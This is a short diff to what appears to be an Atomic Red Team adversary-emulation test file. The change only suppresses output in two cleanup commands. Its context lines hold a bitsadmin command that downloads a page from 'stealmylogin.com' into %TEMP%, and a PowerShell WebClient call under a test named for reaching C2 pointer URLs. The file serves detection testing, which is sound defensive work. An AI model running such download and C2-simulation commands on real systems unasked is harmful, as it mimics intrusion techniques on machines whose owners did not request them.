@@ -14,7 +14,7 @@ atomic_tests:
     command: |
       bitsadmin.exe /transfer "DonwloadFile" http://www.stealmylogin.com/ %TEMP%\bitsadmindownload.html
     cleanup_command: |
-      del %TEMP%\bitsadmindownload.html
+      del %TEMP%\bitsadmindownload.html >nul 2>&1
 
 
 - name: Reach out to C2 Pointer URLs via powershell
@@ -31,5 +31,4 @@ atomic_tests:
       $wc = New-Object System.Net.WebClient
       $T1102 = $wc.DownloadString("https://www.aol.com/")
     cleanup_command: |
-      Clear-Variable T1102
-
+      Clear-Variable T1102 >$null 2>&1
